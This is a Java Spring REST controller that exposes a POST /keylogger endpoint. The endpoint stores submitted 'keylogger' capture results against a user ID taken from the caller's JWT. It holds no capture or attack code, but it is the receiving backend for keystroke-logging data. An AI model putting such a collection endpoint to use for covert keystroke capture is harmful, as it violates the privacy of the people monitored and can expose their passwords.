package com.ucb.agente_reconhecimento.web.controller;

import com.ucb.agente_reconhecimento.service.KeyloggerService;
import com.ucb.agente_reconhecimento.web.dto.keylogger.KeyloggerResultadoRequest;
import jakarta.validation.Valid;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationToken;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/keylogger")
public class KeyloggerEndpoint {

    private final KeyloggerService keyloggerService;

    public KeyloggerEndpoint(KeyloggerService keyloggerService) {
        this.keyloggerService = keyloggerService;
    }

    @PostMapping
    public ResponseEntity<Void> salvarCaptura(
            @RequestBody @Valid KeyloggerResultadoRequest request,
            JwtAuthenticationToken authentication) {

        Integer usuarioId = Integer.parseInt(authentication.getToken().getSubject());
        keyloggerService.salvar(request, usuarioId);

        return ResponseEntity.status(HttpStatus.CREATED).build();
    }
}